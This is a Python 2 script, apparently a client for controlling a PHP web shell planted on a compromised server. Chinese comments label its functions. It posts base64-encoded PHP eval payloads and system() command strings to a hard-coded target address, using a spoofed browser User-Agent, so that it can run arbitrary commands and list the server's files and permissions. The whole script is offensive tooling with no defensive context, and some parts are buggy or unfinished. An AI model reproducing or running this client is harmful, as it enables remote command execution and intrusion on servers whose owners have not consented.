#! /usr/bin/env python
#! -*-coding:utf-8 -*-
'''
    注意 路径必须用.replace('\\', '\\\\')转换线
'''
import subprocess
import sqlite3
import re
from cmd import Cmd
import os
import sys
import urllib
import urllib2
import requests
import base64
import re
prompt = "pyshell> "
Object = None

url = 'http://172.28.100.76/1.php'
initcode = "@eval(base64_decode($_POST[x]));&x="

def post(url, data):
    header = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN;'
    'rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14'}
    req = requests.post(url, data=data, headers=header)
    return req.content

def oldpost(url, data):
    header = {'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN;'
    ' rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14'}
    # data = "w=%s" % data
    req = urllib2.Request(url, data=data)
    req.add_header('User-Agent', header)
    html = urllib2.urlopen(req)
    data = html.read()
    html.close()
    return data


# 执行shell脚本
def DoShell():

	url = raw_input('Pls input url:')
	code = raw_input('Pls input cmd >')
	data = "shellpass=system({0});".format(code)
	response = oldpost(url, data)
	print response

def Showrwx(num):
	permx = {1:'--x', 2:'-w-', 4:'r--', 7:"rwx"}
	if num in permx.keys():
		return permx[num]
	elif num == 3 :
		return "-wx"
	elif num == 5:
		return "r-x"
	elif num == 6:
		return "rw-"
	else:
		return "rwx"
	return string

def ShowRule(list):
    string = "total: {0}\nperm\t\tsize\t\tdate\t\tfile\n".format(len(list))
    for line in list:
        string += "{0}".format(Showrwx(line[3][1]) + Showrwx(line[3][2]) + Showrwx(line[3][3]))
        string += "\t{0}".format(line[2])
        string += "\t{0}".format(line[1])
        string += "\t{0}\n".format(line[0])
    print string

#浏览文件目录
def GetFilePath():
	
	url = raw_input('Pls input url:')
	sitepath = raw_input('Pls input sitepath:')
	initcode = "shellpass=@eval(base64_decode($_POST[x]));&x="
	phpcode = initcode
	code = '''@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("-|");
    ;$D=%s;$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}
    else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T="time:".@date("Y-m-d H:i:s",@filemtime($P));
    @$E="perm:".substr(base_convert(@fileperms($P),10,8),-4);$R=" ".$T." size:".@filesize($P)." ".$E."
    ";if(@is_dir($P))$M.="file:".$N."/".$R;else $L.="file:".$N.$R;}echo $M.$L;@closedir($F);};echo("|<-");die();
    ''' % "'{0}'".format(sitepath).strip()
	filelist = re.compile(r'file:([\s\S]+?)\stime:([\s\S]+?)\ssize:(\d+?)\sperm:(\d{4})')
	phpcode += "{0}".format(base64.b64encode(code))

	order = oldpost(url, phpcode)
	print (order)
	if order == '-|ERROR:// Path Not Found Or No Permission!|<-':
		print "Error: Path Not Found Or No Permission!"
		return False
	else:
		print("website path: " + sitepath)
		ShowRule(filelist.findall(order))


if __name__ == '__main__':
	prompt = "pyshell> "
	Object = None
	op = raw_input('Pls input num(1:DoShell;2:files management;3:DB):')
	if op == '1':
		DoShell()
	elif op == '2':
		GetFilePath()
	elif op == '3':
		pass